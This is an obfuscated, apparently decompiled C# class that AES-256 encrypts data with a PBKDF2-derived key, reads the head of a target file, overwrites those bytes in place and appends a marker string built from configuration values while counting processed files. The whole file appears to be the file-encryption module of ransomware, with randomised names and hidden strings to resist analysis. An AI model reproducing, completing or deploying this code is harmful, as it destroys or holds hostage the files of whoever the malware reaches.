using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace cmxGDwJsHiH;

public static class eOMPCtTZsK
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] APnlaCspUWtd(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = MXGzkYDxprVy(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes MXGzkYDxprVy(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] elcjuQQVOuPO(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (GGXHsdxTjwNJn.LqtEdmbXXRZ == getString_0(107396968))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (GGXHsdxTjwNJn.zHVjUhBGwaRp)
			{
				try
				{
					File.AppendAllText(GGXHsdxTjwNJn.ggXwxjUYnLoRjW, getString_0(107392704) + string_0 + getString_0(107408056) + ex.Message + getString_0(107396346));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void dLSqiBzpdKgARW(string DsmlTVEGDoDU, byte[] OtiYxKZSCTfnyd, byte[] SmzKZYumoOEC = null)
	{
		try
		{
			byte[] array = null;
			if (GGXHsdxTjwNJn.LqtEdmbXXRZ == getString_0(107396968))
			{
				array = (GGXHsdxTjwNJn.TbNpXAhfsSvoF ? Encoding.ASCII.GetBytes(GGXHsdxTjwNJn.hIhPBIfOSm(GGXHsdxTjwNJn.hccsNgdDdQ) + GGXHsdxTjwNJn.hIhPBIfOSm(getString_0(107408478)) + Convert.ToString(GGXHsdxTjwNJn.gZpeCkfprtF) + GGXHsdxTjwNJn.hIhPBIfOSm(getString_0(107408478))) : Encoding.ASCII.GetBytes(GGXHsdxTjwNJn.hIhPBIfOSm(GGXHsdxTjwNJn.hccsNgdDdQ) + GGXHsdxTjwNJn.hIhPBIfOSm(getString_0(107408487)) + Convert.ToString(GGXHsdxTjwNJn.gZpeCkfprtF) + GGXHsdxTjwNJn.hIhPBIfOSm(getString_0(107408487))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(DsmlTVEGDoDU, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(OtiYxKZSCTfnyd, 0, OtiYxKZSCTfnyd.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(DsmlTVEGDoDU, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!GGXHsdxTjwNJn.TbNpXAhfsSvoF)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(SmzKZYumoOEC, 0, SmzKZYumoOEC.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (GGXHsdxTjwNJn.TbNpXAhfsSvoF ? Encoding.ASCII.GetBytes(GGXHsdxTjwNJn.hIhPBIfOSm(GGXHsdxTjwNJn.hccsNgdDdQ) + GGXHsdxTjwNJn.hIhPBIfOSm(getString_0(107408478)) + Convert.ToString(GGXHsdxTjwNJn.gZpeCkfprtF) + GGXHsdxTjwNJn.hIhPBIfOSm(getString_0(107408478))) : Encoding.ASCII.GetBytes(GGXHsdxTjwNJn.hIhPBIfOSm(GGXHsdxTjwNJn.hccsNgdDdQ) + GGXHsdxTjwNJn.hIhPBIfOSm(getString_0(107408487)) + Convert.ToString(GGXHsdxTjwNJn.gZpeCkfprtF) + GGXHsdxTjwNJn.hIhPBIfOSm(getString_0(107408487))));
				FileStream fileStream2 = new FileStream(DsmlTVEGDoDU, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(OtiYxKZSCTfnyd, 0, OtiYxKZSCTfnyd.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(DsmlTVEGDoDU, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!GGXHsdxTjwNJn.TbNpXAhfsSvoF)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(SmzKZYumoOEC, 0, SmzKZYumoOEC.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			GGXHsdxTjwNJn.LyRFRlRmWuJeh++;
		}
		catch (Exception ex)
		{
			if (GGXHsdxTjwNJn.zHVjUhBGwaRp)
			{
				try
				{
					File.AppendAllText(GGXHsdxTjwNJn.ggXwxjUYnLoRjW, getString_0(107392704) + DsmlTVEGDoDU + getString_0(107408501) + ex.Message + getString_0(107396346));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (GGXHsdxTjwNJn.TbNpXAhfsSvoF ? Encoding.ASCII.GetBytes(GGXHsdxTjwNJn.hIhPBIfOSm(GGXHsdxTjwNJn.hccsNgdDdQ) + GGXHsdxTjwNJn.hIhPBIfOSm(getString_0(107408478)) + Convert.ToString(GGXHsdxTjwNJn.gZpeCkfprtF) + GGXHsdxTjwNJn.hIhPBIfOSm(getString_0(107408478))) : Encoding.ASCII.GetBytes(GGXHsdxTjwNJn.hIhPBIfOSm(GGXHsdxTjwNJn.hccsNgdDdQ) + GGXHsdxTjwNJn.hIhPBIfOSm(getString_0(107408487)) + Convert.ToString(GGXHsdxTjwNJn.gZpeCkfprtF) + GGXHsdxTjwNJn.hIhPBIfOSm(getString_0(107408487))));
			FileStream fileStream4 = new FileStream(DsmlTVEGDoDU, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(OtiYxKZSCTfnyd, 0, OtiYxKZSCTfnyd.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(DsmlTVEGDoDU, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!GGXHsdxTjwNJn.TbNpXAhfsSvoF)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(SmzKZYumoOEC, 0, SmzKZYumoOEC.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static eOMPCtTZsK()
	{
		Strings.CreateGetStringDelegate(typeof(eOMPCtTZsK));
	}
}
